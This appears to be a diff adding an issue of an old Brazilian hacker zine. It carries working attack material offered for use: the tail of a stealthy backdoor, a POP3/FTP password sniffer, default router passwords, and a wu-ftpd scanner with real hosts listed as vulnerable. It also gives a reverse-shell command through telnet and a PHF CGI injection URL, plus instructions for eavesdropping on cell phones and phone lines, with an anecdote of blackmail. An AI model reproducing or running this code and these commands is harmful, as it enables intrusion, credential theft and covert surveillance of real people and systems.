+  ina.sin_addr.s_addr = INADDR_ANY;
+  ina.sin_family      = AF_INET;
+  ina.sin_port        = htons(PORT);
+
+  if(bind(s0ck, (struct sockaddr *) &ina, sizeof(ina)) == -1) return(0);
+
+  if(listen(s0ck,5) == -1) return(0);
+}
+
+// This function is based in sekure ping backdoor by jamez.
+#ifdef PINGPKT
+int ping_verify() {
+  struct protoent *p;
+  struct sockaddr_in fr0m;
+  int tam, size;
+  char pkt[4096];
+
+  p = getprotobyname("icmp");
+  if ((s0ck = socket(AF_INET, SOCK_RAW, p->p_proto)) == -1) return 0;
+
+  do {
+
+    tam = sizeof(fr0m);
+    size = recvfrom(s0ck,pkt,sizeof(pkt),0,(struct sockaddr *)&fr0m,&tam);
+
+  } while (size != SIZEPACK + 28);
+
+  #ifdef MAKELOG
+  mklog(4, inet_ntoa(fr0m.sin_addr));
+  #endif
+  return 1;
+
+}
+#endif
+
+#ifdef CONNECT
+int cverify(void) {
+  int size, c0nnect;
+  struct sockaddr_in client;
+
+  osock();
+  size = sizeof(client);
+  if((c0nnect = accept(s0ck, (struct sockaddr *) &client, &size)) == -1)
+         return 0;
+  size = sizeof(PASSWORD) - 1;
+  if(recv(c0nnect, pass, size,0) == -1) return 0;
+  if(strncmp((char *)PASSWORD, pass, size) == 0) {
+         #ifdef MAKELOG
+         mklog(5, inet_ntoa(client.sin_addr));
+         #endif
+         close(c0nnect); close(s0ck);
+         return 1;
+  }
+  else { close(c0nnect); close(s0ck); return 0; }
+}
+#endif
+
+int main(int argc, char *argv[]) {
+  int mypid;
+
+  // Hm... you will recive the msg Terminate. Ignore it...
+  mypid = getpid();
+  fork();
+  kill(mypid,15);
+
+  // Maskare the command...
+  bzero(argv[0],sizeof("/sbin/XXXXXXXXXXXXXXX"));
+  strncpy(argv[0], FAKENAME,sizeof(FAKENAME));
+
+  // get the root shell...
+  get_sh("root");
+
+  // h0h0h0... U can kill me!!!! I'm imortall!!!!
+  signal(SIGHUP, SIG_IGN);
+  signal(SIGTERM, SIG_IGN);
+
+  // Start the looping...
+  while(1) {
+
+        #ifdef FILEPASS
+        if(fverify(TMP_FILE) == 2)
+          #ifdef SUIDBACK
+               makeback();
+          #else
+               break;
+          #endif
+
+        #else
+          #ifdef FILENAME
+             if(fverify(TMP_FILE) >= 1)
+             #ifdef SUIDBACK
+                makeback();
+             #else
+                break;
+             #endif
+
+          #else
+            #ifdef PINGPKT
+               if(ping_verify() == 1)
+               #ifdef SUIDBACK
+                  makeback();
+               #else
+                  break;
+               #endif
+
+            #else
+              #ifdef CONNECT
+                 if(cverify() == 1)
+                 #ifdef SUIDBACK
+                     makeback();
+                 #else
+                     break;
+                 #endif
+              #else
+                 #ifdef SUIDBACK
+                     makeback();
+                 #else
+                     break;
+                 #endif
+              #endif
+            #endif
+          #endif
+        #endif
+
+        sleep(SLEEPTIME);
+  }
+
+  // Active the backdoor(s)...
+  #ifdef DAEMONBACK
+     osock();
+     while( fork() == 0 ) {
+         openport();
+         sleep(SLEEPTIME);
+     }
+  #endif
+}
+
+<-->
+
+       _xXXXP^''                     ``^YXXXx_
+     _xXXXXP~     07 - Routeadores       ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_            Carti           _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+Normalmente, (nao sei pq) instalam senhas padrao em seus produtos, vejamos:
+
+Ascend:
+    A configuracao de fabrica de routeadores Ascend inclui uma string de
+comunidade de leitura "public" w uma string de comunidade leitura/gravacao
+"write" descobertas pelo pessoal da Network Associates Inc
+
+Bay:
+    Roteadores da Bay Networks permitem, como padrao que acessos em nivel
+usuario leiam as strings de comunidade SNMP, tanto as de leitura quanto as
+de gravacao. Para executar tal exploracao, um atacante pode usar a id padrao
+"User" sem senha. No prompt do roteador, basta digitar
+"show snmp comm types", o que exibe os nomes de uma comunidade tanto de
+leitura quanto gravacao.
+    A seguir os principais fornecedores de dispositivos de rede e seus nomes
+de comunidade leitura/gravacao padrao tipicos de fabrica.
+    A lista a seguir inclui os nomes de comunidade SNMP mais usados
+atualmente:
+
+public
+private
+secret
+world
+read
+network
+community
+write
+cisco
+allprivate     /* eh a principal usada no solaris */
+admin
+default
+password
+tivoli
+openview
+monitor
+manager
+security
+
+Senhas de dispositivos
+Dispositivos        Leitura        Leitura/Gravacao
+
+Ascend              public          write
+Bay                 public          private
+Cisco               public          private
+3Com                public          manager,security
+
+Porta dos fundos em routeadores
+
+Muitos fabricantes instalam em seus produtos uma porta dos fundos,
+(coisa dificil de entender o porque), para q possamos contornar um
+administrador bloqueado, mas na pratica elas fornecem aos atacantes portas
+dos fundos para sua rede. Ao longo dos anos foram descobertos diversos nomes
+de usuarios e senhas padrao de alguns dispositivos de redes mais
+populares...
+
+serei breve, entao so vou colocar as senhas numa tabela aki e voces se virem
+e tals, okz.
+
+Dispositivo             Nome Usuario       Senha          Nivel
+Roteadores Bay          User               <nula>         Usuario
+                        Manager            <nula>         Admin
+Switch Bay 350T         NetICs             NA             Admin
+Bay SuperStack II       security           security       Admin
+3Com                    admin              synnet         Admin
+                        read               synnet         Usuario
+                        write              synnet         Admin
+                        debug              synnet         Admin
+                        tech               tech
+                        monitor            monitor        Usuario
+                        manager            manager        Admin
+                        security           security       Admin
+Cisco                   (telnet)           c(Cisco 2600)  Usuario
+                        (telnet)           cisco          Usuario
+                        enable             cisco          Admin
+                        (telnet)           cisco router
+Shiva                   root               <nula>         Admin
+                        Guest              <nula>         Usuario
+Webramp                 wradmin            trancell       Admin
+Motorola                cablecom           router         Admin
+
+Essa ultima eh usada nos cable modens, entao se akele seu "amigo" tem cable
+modem, vc ja sabe...
+tankz a todos ...
+Carti
+
+       _xXXXP^''                     ``^YXXXx_
+     _xXXXXP~      08 - Manifesto        ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat Struck        _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+  Por que a policia se preocupa em nos perseguir?
+  Nos somos mais violentos q assassinos? Somos mais odiados q estupradores?
+Somos mais criminosos q ladroes???
+  Por que??
+
+  Por que ao invez da policia estar nas ruas impedindo que nossos irmaos,
+filhos ou sobrinhos de 10 anos sejam molestados por vagabundos, ela esta
+atras de nos???
+  Por que ao invez da policia estar prendendo o ladrao que roubou nossos
+pais, tios, avos para gastar o dinheiro em drogas, ela esta atras de nos??
+  Por que ao invez da policia estar levando o assassino de nossos amigos,
+parentes e conhecidos para prisao, ela esta atras de nos???
+  Por que??
+
+  Voces tem mais raiva de nos do que destes Vagabundos marginais??
+  Voces sentem mais raiva de nos do q destes Ladroes viciados???
+  Voces tem mais raiva de nos do que destes Assassinos???
+
+  Sabe qual o motivo de nos sermos perseguidos??? A lei.
+  A lei foi criada no Brasil logo apos sua independencia pelo imperador.
+Um imperador portugues, o mesmo que declarou independencia.
+  O mesmo que anos antes foi contra a Insurreicao Pernambucana cujo
+objetivo era a independencia porem feita pelo povo.
+  O mesmo imperador q criou o poder moderador para manter todo o poder
+em suas maos chegando a quase um absolutismo.
+  A lei soh serve para uma coisa: manter o poder nas maos da elite.
+
+  E sera que essa elite respeita a lei q eles criaram???
+  A constituicao outorgada de 1824 unificava Estado / Igreja Catolica.
+Ou seja, no Brasil soh poderia existir uma religiao: a catolica. Voce
+ja percebeu q todos os feriados sao catolicos???
+  Um fato historico foi que o governo brasileiro decidiu povoar o Rio
+Grande do Sul com colonias alemas. Porem nesta epoca a religiao seguida
+na Alemanha era a protestante.
+  Como iriam chamar os alemaes para viver no Brasil porem com a condicao
+deles nao poderem mais exercer a sua religiao??? O que aconteceu?? Eles
+mudaram a lei??? Nao. Eles infringiram a lei. Se fizeram de cegos e
+deixaram q os alemaes construissem suais igrejas protestantes no Brasil.
+
+  Mas enfim... o que a lei tem a ver com os hackers??
+  Ja existem leis contra crimes virtuais?? Recentemente foram criadas
+algumas leis contra crime por computador. Mas nao eh por isso que somos
+perseguidos.
+  Nos somos perseguidos por falarmos mal do Presidente da republica.
+  Parece incrivel mas no Brasil nao existe liberdade de expressao.
+Qualquer coisa que difame o presidente eh crime.
+  Por isso que o hacker brasileiro comecou a ser perseguido. Pq agora
+surgiram os grupos hackers anti-politicos. Eles falam das cagadas do
+presidente em seus defacements e e' isso que da cadeia.
+
+  Desde a independencia do Brasil ateh os dias de hj, a elite brasileira
+soh trocou de roupa. Nada mudou. Difamar o imperador eh tao grave qto
+difamar o presidente atualmente.
+  Por que nada muda?? Por que as revolucoes todas sao feitas pela elite
+e nao pelo povo. E a elite gostaria de que as coisas mudassem??
+
+  Por que o principe de Portugal (D. Pedro I), que herdaria o trono
+incluindo suas colonias no Brasil, desejaria a independencia??
+  Por que uma senhora de escravos (Princesa Isabel), que tinha em seu
+poder mais de 1000 escravos, desejaria a abolicao da escravatura?
+  Por que um grande fazendeiro (Getulio Vargas) desejaria uma revolucao
+contra os fazendeiros (Revolucao de 30)??
+
+  O povo brasileiro nunca conquistou nenhuma revolucao. Apenas a elite
+brasileira, que tenta enganar o povo fingindo estar mudando as coisas
+enquanto continua tudo igual.
+  Agora esta comecando uma nova revolucao. Uma revolucao tecnologica
+feita pelo povo contra a elite. A situacao pode finalmente mudar e a
+elite esta assustada.
+  Por isso somos perseguidos, presos e odiados.
+  Mas essa revolucao nao ha como voces impedirem, pois voces podem
+pegar um de nos. Mas a cada 1 q voces pegam surgem mais 3 e o numero
+soh aumenta para o nosso lado.
+  Voces nunca conseguirao pegar todos nos!
+  Voces nunca conseguirao acabar com essa revolucao!
+
+               Cheat Struck
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~   09 - Sniffing Simples    ~YXXXXx_
+  _xXXXXXX(            parte 2             )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat Struck        _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+   Waapah!!!
+   Teve uns loko reclamando do sniff.c publicado na edicao passada e tal...
+   Q merda! Eu coloco um progzinhu tao chinelo como akele apenas para explicar
+a teoria do sniffing simples e tem loko q pira com issu.
+   Ta certo! Para esses krinhas e tb pq eu nao tenhu mto tempo para fazer
+uma materia decente, vou simplesmente publicar mais um programa (c) Struck
+para demonstrar como pode ser utilizada essa t3kn33k.
+   O programa salva senhas POP3 e FTP no arquivo /tmp/sniff (default).
+   Nao tem misterio.
+   O unico problema eh q vc deve roda-lo em background pois ele foi codeado
+as pressas e nao tive tempo para aprimoracoes...
+   Mude o que precisar nele e nao reclama.
+
+<++> sniff/pfs.c
+/* POP3/FTP Sniffer v0.9
+   by Cheat Struck <cheat@struck.com>
+
+   Esse sniffer fika ouvindo as conexoes tcp e grava todas msgs que
+  possuem identificacoes de login/senha do FTP e POP3.
+   O programa nao confirma c as senhas usadas sao verdadeiras ou falsas.
+   Ainda tem alguns bugs mas da pra pegar varias senhas.
+
+*/
+
+// Defina aki o arquivo onde as contas serao salvas.
+#define WFILE "/tmp/sniff"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <netinet/ip.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+
+int main(int argc, char *argv[]) {
+  struct protoent *p;
+  struct sockaddr_in fr0m;
+  int tam, size, i;
+  char pkt[4096];
+  char pass[4096], login[4096];
+  int d=0, s0ck;
+  FILE *fp;
+
+  p = getprotobyname("tcp");
+  if ((s0ck = socket(AF_INET, SOCK_RAW, p->p_proto)) == -1) return 0;
+
+  do {
+    memset(&pkt,0x00,sizeof(pkt));
+
+    tam = sizeof(fr0m);
+    size = recvfrom(s0ck,pkt,sizeof(pkt),0,(struct sockaddr *)&fr0m,&tam);
+
+    for(i=0;i!=4096;i++) {
+        char id1[4096], id2[4096];
+
+        memset(&pass,0x00,sizeof(pass));
+        memset(&login,0x00,sizeof(login));
+        memset(&id1,0x00,sizeof(id1));
+        memset(&id2,0x00,sizeof(id2));
+        sscanf(&pkt[i],"%s %s\n", id1, login);
+        sscanf(&pkt[d],"%s %s\n", id2, pass);
+
+        if(!strncmp(id1,"USER",4) || !strncmp(id1,"user",4)) {
+            printf("%s - Login: %s\n",inet_ntoa(fr0m.sin_addr),login);
+            fp = fopen(WFILE,"a+");
+            fprintf(fp,"%s - Login: %s\n",inet_ntoa(fr0m.sin_addr),login);
+            d=i; }
+        else if(!strncmp(id2,"PASS", 4) || !strncmp(id2,"pass", 4)) {
+            printf("%s - Password: %s\n\n",inet_ntoa(fr0m.sin_addr),pass);
+            fprintf(fp, "%s - Password: %s\n\n",inet_ntoa(fr0m.sin_addr),pass);
+            fclose(fp);
+            d=0; }
+
+    }
+
+  } while (!0);
+
+}
+<-->
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~    10 - Wu-ftpd Scanning   ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat Struck        _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+   Voces ja devem estar percebendo que como estou com muita falta de tempo
+estou preenchendo os buracos da zine com programas de minha autoria. O
+wuscan.pl eh apenas mais um deles.
+   Este programa foi feito mais para um auto-aprendizado de perl, mas ficou
+bom o suficiente pra fazer um peso na zine.
+   Mas porque em perl?? Por que perl eh uma linguagem mais portavel do que
+C. Sendo assim os programas em perl atingem um publico maior pois podem ser
+usados por usuarios de linux, aix, sunos, e ate' windows, sem precisar alte-
+rar o source do programa.
+   O programa e' facil de ser usado. Basta ter uma hostlist em maos e colo-
+car o programa para scanear os hosts. O resultado eh impresso na tela. Se
+a versao do wu-ftpd estiver cacheada no programa indica que o programa eh
+vulneravel.
+   Ae vai o programa...
+
+<++> wuscan/wuscan.pl
+#!/usr/bin/perl
+#
+# Wu-ftpd Bugs Scanner
+# by Cheat Struck - cheat@struck.8m.com
+#
+
+use Socket;
+print "Wu-ftpd Bugs Scanner";
+print "\nby Cheat Struck \<cheat\@struck.8m.com\>\n\n";
+if ($ARGV[0] eq '') {
+   print "Usage: wuscan.pl \<ip_list\>\n";
+   exit;
+   }
+
+$p = 21;
+$proto = getprotobyname('tcp');
+
+open (FILE,"$ARGV[0]") || die "Where is the IPs LIST?";
+do{
+	$x=1;$n=0;
+	&gethost;
+	&connection;
+	&data1;
+	close S;
+
+}while(!eof(FILE));
+
+sub gethost
+{
+        $host=''; $var12='';
+        do{
+                $host="$host$var12";
+                read(FILE, $var12, 1);
+        }while($var12 ne chr(10));
+}
+
+sub connection
+{
+        $in_addr = (gethostbyname($host));
+        $addr = sockaddr_in($p,$in_addr);
+        socket(S, AF_INET, SOCK_STREAM, $proto) || return 0;
+        connect(S,$addr) || return 0;
+
+}
+
+sub data1
+{
+$VER1="Version wu-2.4.2-academ[BETA-18](1)";
+$VER2="Version wu-2.6.0(1)";
+$VER3="Version wu-2.5.0(1)";
+$VER4="Version wu-2.4.2-academ[BETA-15](1)";
+$VER5="Version wu-2.4.2-academ[BETA-17](1)";
+
+        $i=0; $temp="";
+        do{
+                read(S, $var1, 1) || return 0;
+                $temp="$temp$var1"; $i++;
+        }while(substr($temp,$i-3,3) ne '220' &&
+               substr($temp,$i-3,3) ne '530' &&
+               $i != 500);
+
+if($i == 500) { return 0; }
+if(substr($temp,$i-3,3) eq '530') { return 0; }
+
+	send (S,"user ftp\n",0) || return 0;
+
+        do{
+                read(S, $var1, 1) || return 0;
+                $temp="$temp$var1"; $i++;
+        }while(substr($temp,$i-3,3) ne '331' && substr($temp,$i-3,3) ne '530');
+
+$i=0;
+        do {
+                $i++;
+        }while(substr($temp,$i,1) ne "(" && $i != 500);
+
+if($i == 500) { return 0; }
+
+        if( substr($temp,$i+1,length($VER1)) eq $VER1 ) {
+           $PATCH="EST 1999)";
+           $VUL="EDT 1998)";
+           if(substr($temp,94,9) eq $PATCH) {
+                print "$host is patched. - $VER1\n";
+                return 1; }
+           if(substr($temp,94,9) eq $VUL) {
+                print "$host is VULNERABLE! - $VER1\n";
+                return 1; }
+           print "$host maybe is VULNERABLE. - $VER1\n";
+           return 1; }
+        if( substr($temp,$i+1,length($VER2)) eq $VER2 ) {
+           print "$host maybe is VULNERABLE. - $VER2\n";
+           return 1; }
+        if( substr($temp,$i+1,length($VER3)) eq $VER3 ) {
+           print "$host maybe is VULNERABLE. - $VER3\n";
+           return 1; }
+        if( substr($temp,$i+1,length($VER4)) eq $VER4 ) {
+           print "$host maybe is VULNERABLE. - $VER4\n";
+           return 1; }
+        if( substr($temp,$i+1,length($VER5)) eq $VER5 ) {
+           print "$host maybe is VULNERABLE. - $VER5\n";
+           return 1; }
+
+$d=$i;
+        do {
+                $d++;
+        }while(substr($temp,$d,1) ne ")");
+
+        printf("$host is not vul. - %s\n",substr($temp,$i+1,$d-$i+1));
+}
+
+<-->
+
+   Bonus!
+   C voce tiver os xploits... Aproveitem estes urls:
+
+water.hre.ntou.edu.tw is VULNERABLE. - Version wu-2.4.2-academ[BETA-15](1)
+water.hre.ntou.edu.tw is VULNERABLE. - Version wu-2.4.2-academ[BETA-15](1)
+www.bdmail.net is VULNERABLE. - Version wu-2.4.2-academ[BETA-15](1)
+rra.hartsem.edu is VULNERABLE. - Version wu-2.4.2-academ[BETA-17](1)
+www.gnv.co.kr is VULNERABLE. - Version wu-2.4.2-academ[BETA-17](1)
+www.dit.ie maybe is VULNERABLE. - Version wu-2.4.2-academ[BETA-18](1)
+www.websp.com maybe is VULNERABLE. - Version wu-2.4.2-academ[BETA-18](1)
+www.mr-homepage.com maybe is VULNERABLE. - Version wu-2.5.0(1)
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~     11 - Back Channel      ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_            Carti           _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+Ataques baseados em xterm e canais reversos:
+Alguem me responda: porque os administradores nao removem o xterm do
+sistema??
+Resposta: humm porque isso aumentaria a seguranca...
+
+Resposta correta, entao eles deixam pra q a gente possa brincar, ehhe.
+
+Eh definico como back channel (canal de retorno) o mecanismo q o canal de
+comunicacao se origina no sistema alvo, em vez de no sistema do atacante.
+
+Dentre os metodos q podem ser usados para conseguir-se isso um deles eh o do
+telnet reverso, com auxilio do nc (NetCat).
+
+Bem, primeiramente como estamos originando a coneccao do sistema remoto,
+temos que ativar o nosso ouvidor pra que aceite a coneccao de telnet
+reversa.
+
+nc -l -n -v -p 80
+nc -l -n -v -p 25
+
+Assegure-se de que nenhum servico esteja ouvindo nessas portas, tais como
+HTTP ou sendmail. Se um servico estiver ouvindo nessas portas ele precisa
+ser encerrado por meio do kill.
+
+Os dois comandos nc sao instruidos a ouvir nas portas 25 e 80 por meio das
+opcoes -l e -p, em modo de saida detalhada(verbose, -v) e nao resolver
+enderecos IP para nomes de host (-n).
+
+Continuando com o projeto, para iniciar um telnet reverso, precisamos
+executar os seguintes comandos no servidor alvo:
+
+/bin/telnet Ip_do_hacao 80 | /bin/sh | /bin/telnet ip_do_racao 25
+
+como nao temos shell la, vamos supor q eles tem o bug do PHF q permite
+executar comandos arbitrarios por meio do browse, a sintaxe ficaria assim:
+
+www.blah.com.br/cgi-bin/phf?Qalias=x%0a/bin/telnet%20Ip_do_racao%2080
+%20|%20/bin/sh%20|%20/bin/telnet%20Ip_do_racao%2025
+
+O que essa string q parece estrememente conplexa faz??
+Bem.. /bin/telnet Ip_do_racao 80 conecta nosso ouvidor nc ah porta 80, que
+eh aonde efetivamente digitaremos nossos comandos. Adotando o mecanismo de
+Entradas/Saidas  convencionais no UNIX, nossa saida padrao, ou teclas
+pressionadas, eh canalizada pra /bin/sh, o shell criado. Que por sua vez, os
+resultados de nossos comandos serao canalizados para
+/bin/telnet Ip_do_racao 25. O resultado final eh um telnet reverso q
+desenrola em duas janelas separadas. As portas 80 e 25 foram escolhidas pq
+sao servicos comuns, cuja saida eh normalmente permitida pela maioria dos
+firewalls, mas qq porta poderia ter sido selecionada.
+
+	Pois eh eh isso ai galela, qq coisa c vc nao entendeu...
+			le denovo.
+
+Escrito por Carti
+
+Usado como referencia "Hackers Expostos"
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~    12 - Escuta em cells    ~YXXXXx_
+  _xXXXXXX(           digitais             )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(          Cheat Struck          )XXXXXXP~
+     ~YXXXXb_           Gbyte            _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+   Tipo... O que eu sabia era que em celulares digitais as conversas
+eram criptografadas e soh podiam ser discriptografadas pelo outro cell.
+Issu impedia os antigos metodos de escutas, os quais bastava encontrar
+um knal que estivesse sendo usado, de serem feitos.
+   Mas parece que tem um jeito de burlar issu.
+   Nao me pergunte... eu nao sei como funciona, eu tentei passar este
+texto pros phreax0rs que eu conheco mas nao consegui nada.
+   Entao ae vai o log da conversa que eu tive com o loko q descobriu a
+parada...
+
+<Gbyte> tenho uma coisa para o ericsson DH 618 , muito disseminado em
+         SP com o Sistema TESS de cartao...
+<Gbyte> DH618 e DH668
+<struck> hm... rlz
+<struck> ta afim de divulgar issu na f3?
+<Gbyte> essa info meio dificil de achar por ai... pensei q pudesse
+         colocar na zine... para o pessoal...
+<struck> =)
+<struck> tipo... soh diz antes sobre uke eh...
+<Gbyte> é soh escuta no test mode dele, soh q é dificil de achar...
+         se alguem achar...
+<Gbyte> tipo, entrar no test mode todo mundo entra agora fazer a
+         escuta ja é meio foda, ve ai com o pessoal se ja sabem disso,
+         senao nem compensa colocar na zine...
+<Gbyte> ta afim? para eu tanto faz...
+<Gbyte> tem alguem q tenha esse cell por ai?
+<struck> heheh... tava vendo issu...
+<struck> pera...
+<Gbyte> o mais comum é o DH668
+<struck> tipo..
+<struck> DH618 e DH668 sao digitais certo?
+<Gbyte> certo
+<struck> escreve entao...
+<Gbyte> vou te falar agora
+<Gbyte> blz
+<Gbyte> nao precisa ter meu nome nao
+<Gbyte> vou te passar agora blz
+<struck> ok
+<Gbyte> entao é o seguinte
+<Gbyte> no , para power on... entrar no test mode : 904059
+<Gbyte> seta para baixo
+<Gbyte> yes
+<Gbyte> 1 , seta para cima, yes
+<Gbyte> 3, clear, 001010
+<Gbyte> isso é a frequencia, tipo binario...
+<Gbyte> algumas funcionam outras nao, sempre comecados de 3 , clear
+<Gbyte> 3, clear 001010 , yes
+<Gbyte> e por fim 86 que é o rx
+<Gbyte> e blz, ok?
+<Gbyte> isso tudo foi fucando... ainda vou descobrir mais, blz?
+<Gbyte> quero saber o tx, teria como comecar a falar na conversa?
+<Gbyte> Tipo ele scannea , acho que partindo da freq 001010 ate pegar
+         uma conversa...
+<struck> hmm...
+<struck> tipo...
+<Gbyte> Meio Bobo, mas na falta de coisa sobre Cells pode colocar
+         isso... olha isso muita pouca gente sabe... e esse Cell é
+         muito vendido em SP... acho q pode ser uma boa, o q acha?
+
+   Eu achei interessante e por issu ta ae. O credito porem nao eh meu
+e sim do Gbyte que descobriu o esquema. Eu nao testei pois nao moro em
+SP e tb porque nao tenhu um cell do modelo descrito.
+   That's all!!
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~   13 - Escutas via modem   ~YXXXXx_
+  _xXXXXXX(                                )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat Struck        _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+ Talvez este texto nao esteja a altura da fatal 3rror por ser um tanto
+basico e de certo ponto de vista ridiculo. Mas tinha um pessoal que
+tava atraz dissu entao ta ae.
+ Vo mostrar neste texto como fazer escutas via modem tanto pelo windows
+qto pelo linux. C bem que de um ponto de vista phreax0r issu nao eh bem
+uma escuta, ja que somente pode ser feita por uma extencao em uma das 2
+linhas que estejam sendo usadas para a conversa.
+   Mas vamos vou descreve-la aki e voce vai ver o quao util pode ser
+esta t3kn33k.
+
+No Windows:
+
+  Entre no HyperTerminal e digite:
+
+atz         <-- Inicia o modem;
+atl3        <-- Aumenta o volume;
+ath1        <-- Ouve o que passa pela linha.
+
+No linux:
+
+~# echo atz >> /dev/modem
+~# echo atl3 >> /dev/modem
+~# echo ath1 >> /dev/modem
+
+   Depois dissu basta aumentar o volume do seu computador e ouvir. Eu
+aconselho o uso de fones de ouvido para nao ser pego escutando conversa
+dos outros.
+   Para encerar de "ath0" ou "atz".
+   Agora que voce consegue ouvir uke os outros estao falando pode apro-
+veitar algumas ferramentas do windows e do linux para gravar o que eles
+estao falando. Tipo... Fiz issu em quanto meu irmao falava com a namorada
+depois mostrei pra ele a gravacao e fiz chantagem(ameacei colocar em mp3
+na inet). hehehehe. Uke ele dizia?? Infelizmente nao posso dizer pois
+eu honro meus acordos.
+   Outra boa ocasiao que issu pode se tornar util eh para gravar os trotes
+em mp3. Ao invez de fikar segurando um gravador perto do telefone, basta
+dar REC no Sound Recorder do windows e converter pra mp3.
+   Blza! Era issu... Espero q essa materia nao tenha sido tao inutil.
+
+        _xXXXP^''                    ``^YXXXx_
+     _xXXXXP~   14 - Quando conheci um   ~YXXXXx_
+  _xXXXXXX(          hacker...             )XXXXXXx_
+xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
+YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
+  ~YXXXXXX(                                )XXXXXXP~
+     ~YXXXXb_        Cheat Struck        _dXXXXP~
+        ~YXXXbx..                    ..xdXXXP~
+
+   Certo dia na irc.viars.com.br no knal #rosário eu tive uma experiencia
+que provavelmente nunca irei me esquecer... Eu finalmente conheci um
+hacker. No inicio fiquei com medo dele me hackear mas depois deu pra
+conversar tranquilo.
+   Essa foi certamente a conversa mais h4x0r que tive com um hacker. E
+esse sim eh um hacker di verdade. Voces logo perceberao o qto ele manja
+ao decorer que lerem o log.
+   Enjoy...
+
+   Nota: Os carateres responsaveis pela cor do texto que o hacker escre-
+via foram tirados. Mas era tudo escrito em vermelho. Phear!
+
+<InBloom> que silêncio
+<InBloom> quem eh rosariense de coração digita: //say $port
+<InBloom> heheheh
+<InBloom> quem eh macho digita: //say $host
+<struck> 193.116.54.15
+<struck> feliz?
+<struck> ImBloom...
+<InBloom> heehhee
+<struck> c vai mi nuka???
+<InBloom> naum
+<struck> entao pra q quiria essa merda??
+<InBloom> pra ve qts im caih
+<struck> =)
+<struck> tenta...
+<struck> //say $ip
+<InBloom> ./run telnet
+<InBloom> ./run regedit
+<struck> ?
+<struck> qq tem?
+<struck> soh vai kba rodandu os prgs
+<InBloom> se tu tem um versao de teste de alguma coisa q acaba em 30
+          dias eh soh tu apaga o registro q tu tem mais 30 e assim vai
+<struck> poxa
+<struck> c eh hacker
+<InBloom> eu sei
+<InBloom> hehehehhee
+<struck> comeh q c discubriu issu?
+<InBloom> anos de pesquisa
+<InBloom> com o tempo a gente aprende
+<InBloom> heauheuaheueheuhe
+<struck> hurra meow...
+<struck> c tem qts anos de esperiencia ja?
+<struck> uns 20???
+<InBloom> 6734821962185
+<InBloom> e dois meses
+<InBloom> + 3 horas e 4 minutos e 39 segundos
+<InBloom> 40
+<InBloom> 41
+<struck> heheh
+<struck> c tem senso di humor...
+<InBloom> muito
+<InBloom> eh uma virtude minha, sabe
+<struck> hehehe
+<struck> eu ateh q me esforco mas nao consigo ser engracado
+<struck> =(
+<struck> heheh
+<InBloom> pois eh...
+<struck> tipus...
+<InBloom> um dia te ensino
+<struck> tkz
+<struck> vc deve ser de varios grupos hackers neh?
+<struck> ou age por conta propria???
+<InBloom> atualmente...
+<InBloom> 23
+<struck> puxa!!!
+<struck> qual o nome dos melhores q c acha?
+<InBloom> Oxblood ruffin
+<InBloom> meu amigo
+<struck> nao...
+<struck> o nome dos grps
+<InBloom> sabe, o cara entende ateh
+<struck> aposto q sim
+<InBloom> cDc
+<struck> cDc foi quem fez o BO neh???
+<struck> porra!! c ajudou a faze-lo?
+<InBloom> aham
+<struck> c deve manja muuuuuuuito entao....
